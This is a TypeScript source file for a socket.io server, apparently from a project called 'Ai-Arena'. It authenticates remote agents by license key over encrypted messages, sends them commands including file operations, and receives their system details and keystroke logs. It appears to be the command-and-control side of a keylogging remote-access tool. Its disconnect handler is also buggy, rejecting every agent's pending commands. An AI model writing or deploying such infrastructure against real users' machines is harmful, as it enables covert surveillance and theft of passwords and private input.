/**
 * Ai-Arena — Socket.io Server Handler
 *
 * Manages all agent connections, command dispatch, and real-time data flow.
 * All messages are encrypted with AES-256-GCM via crypto.ts.
 */

import type { Server } from 'socket.io'
import { encrypt, decrypt } from './crypto'

interface AgentConnection {
  id: string
  licenseKey: string
  socketId: string
  systemInfo: Record<string, unknown> | null
  platformInfo: Record<string, unknown> | null
  connectedAt: Date
  lastHeartbeat: Date
}

// In-memory store of connected agents (licenseKey -> connection)
const connectedAgents = new Map<string, AgentConnection>()
// Socket ID -> licenseKey mapping
const socketToLicense = new Map<string, string>()
// Pending command callbacks (commandId -> resolver)
const pendingCommands = new Map<string, {
  resolve: (data: unknown) => void
  reject: (err: Error) => void
  timeout: NodeJS.Timeout
}>()

export function getConnectedAgents(): Map<string, AgentConnection> {
  return connectedAgents
}

export function getAgentByLicenseKey(key: string): AgentConnection | undefined {
  return connectedAgents.get(key)
}

export function isAgentOnline(licenseKey: string): boolean {
  const agent = connectedAgents.get(licenseKey)
  if (!agent) return false
  // Consider agent offline if no heartbeat for 90 seconds
  const timeSinceHeartbeat = Date.now() - agent.lastHeartbeat.getTime()
  return timeSinceHeartbeat < 90000
}

export function sendCommandToAgent(licenseKey: string, command: Record<string, unknown>): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const agent = connectedAgents.get(licenseKey)
    if (!agent) {
      reject(new Error('Agent is offline or not connected'))
      return
    }

    const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
    const fullCommand = { ...command, id: commandId }

    // Set timeout (30s for most commands, 60s for file operations)
    const isFileOp = (command.type as string)?.startsWith('files:')
    const timeoutMs = isFileOp ? 60000 : 30000

    const timeout = setTimeout(() => {
      pendingCommands.delete(commandId)
      reject(new Error('Command timed out'))
    }, timeoutMs)

    pendingCommands.set(commandId, { resolve, reject, timeout })

    // The encrypted sending happens in the io wrapper
    sendToSocket(agent.socketId, { type: 'command', ...fullCommand })
  })
}

function sendToSocket(socketId: string, message: unknown) {
  // This is called from within the socket.io server context
  // The actual sending happens via the io reference passed to setupSocketHandler
  const io = (globalThis as unknown as { __arena_io?: Server }).__arena_io
  if (io) {
    const encrypted = encrypt(message)
    io.to(socketId).emit('data', encrypted)
  }
}

// Event handler callback type
type EventHandler = (licenseKey: string, data: unknown) => void
const eventHandlers = {
  heartbeat: [] as EventHandler[],
  status: [] as EventHandler[],
  keystrokes: [] as EventHandler[],
  audit: [] as EventHandler[],
  agentConnect: [] as EventHandler[],
  agentDisconnect: [] as EventHandler[],
}

export function onEvent(event: keyof typeof eventHandlers, handler: EventHandler) {
  if (eventHandlers[event]) {
    eventHandlers[event].push(handler)
  }
}

function emitEvent(event: keyof typeof eventHandlers, licenseKey: string, data: unknown) {
  const handlers = eventHandlers[event] || []
  for (const handler of handlers) {
    try {
      handler(licenseKey, data)
    } catch (e) {
      console.error(`[Socket] Event handler error (${event}):`, e)
    }
  }
}

export function setupSocketHandler(io: Server) {
  ;(globalThis as unknown as { __arena_io?: Server }).__arena_io = io

  // Agent authentication middleware
  io.use((socket, next) => {
    try {
      const raw = socket.handshake.auth?.token as string
      if (!raw) {
        return next(new Error('No authentication token provided'))
      }

      const data = decrypt(raw) as { type: string; licenseKey?: string; encKey?: string }
      if (data.type !== 'auth' || !data.licenseKey) {
        return next(new Error('Invalid authentication payload'))
      }

      // Store license key in socket for later use
      ;(socket.data as { licenseKey: string }).licenseKey = data.licenseKey
      next()
    } catch (e) {
      next(new Error('Authentication failed: ' + (e instanceof Error ? e.message : 'Unknown error')))
    }
  })

  io.on('connection', (socket) => {
    const licenseKey = (socket.data as { licenseKey: string }).licenseKey
    const socketId = socket.id

    console.log(`[Socket] Agent connected: ${licenseKey} (${socketId})`)

    // Register agent
    const agent: AgentConnection = {
      id: socketId,
      licenseKey,
      socketId,
      systemInfo: null,
      platformInfo: null,
      connectedAt: new Date(),
      lastHeartbeat: new Date(),
    }
    connectedAgents.set(licenseKey, agent)
    socketToLicense.set(socketId, licenseKey)

    // Send auth confirmation (encrypted)
    const authResponse = encrypt({ type: 'auth:ok', message: 'Connected to Ai-Arena' })
    socket.emit('data', authResponse)

    emitEvent('agentConnect', licenseKey, { connectedAt: agent.connectedAt })

    // Handle encrypted data from agent
    socket.on('data', (raw: string) => {
      try {
        const message = decrypt(raw) as Record<string, string>

        switch (message.type) {
          case 'heartbeat': {
            const existing = connectedAgents.get(licenseKey)
            if (existing) {
              existing.lastHeartbeat = new Date()
              if (message.systemInfo) {
                try {
                  existing.systemInfo = typeof message.systemInfo === 'string' ? JSON.parse(message.systemInfo) : message.systemInfo
                } catch { /* ignore */ }
              }
            }
            emitEvent('heartbeat', licenseKey, message.data)
            break
          }

          case 'result': {
            const commandId = message.id || message.commandId
            if (commandId) {
              const pending = pendingCommands.get(commandId)
              if (pending) {
                clearTimeout(pending.timeout)
                pendingCommands.delete(commandId)
                pending.resolve(message.data || message)
              }
            }
            break
          }

          case 'keystrokes': {
            emitEvent('keystrokes', licenseKey, message.data || message.entries)
            break
          }

          case 'audit': {
            emitEvent('audit', licenseKey, message.data || message.entries)
            break
          }

          case 'system:info': {
            const existing = connectedAgents.get(licenseKey)
            if (existing) {
              existing.systemInfo = message.data as Record<string, unknown>
              existing.platformInfo = message.platformInfo as Record<string, unknown>
            }
            break
          }

          default:
            console.log(`[Socket] Unknown message type from ${licenseKey}:`, message.type)
        }
      } catch (e) {
        console.error(`[Socket] Failed to decrypt message from ${socketId}:`, e)
      }
    })

    // Handle disconnect
    socket.on('disconnect', (reason) => {
      console.log(`[Socket] Agent disconnected: ${licenseKey} (${reason})`)
      connectedAgents.delete(licenseKey)
      socketToLicense.delete(socketId)

      // Reject all pending commands for this agent
      for (const [cmdId, pending] of pendingCommands) {
        const agentSocket = socketToLicense.get(socketId)
        // Check if the pending command was for this agent
        pendingCommands.delete(cmdId)
        clearTimeout(pending.timeout)
        pending.reject(new Error('Agent disconnected'))
      }

      emitEvent('agentDisconnect', licenseKey, { reason, disconnectedAt: new Date() })
    })

    socket.on('error', (err) => {
      console.error(`[Socket] Error from ${licenseKey}:`, err.message)
    })
  })

  console.log('[Socket] Ai-Arena WebSocket handler initialized')
}
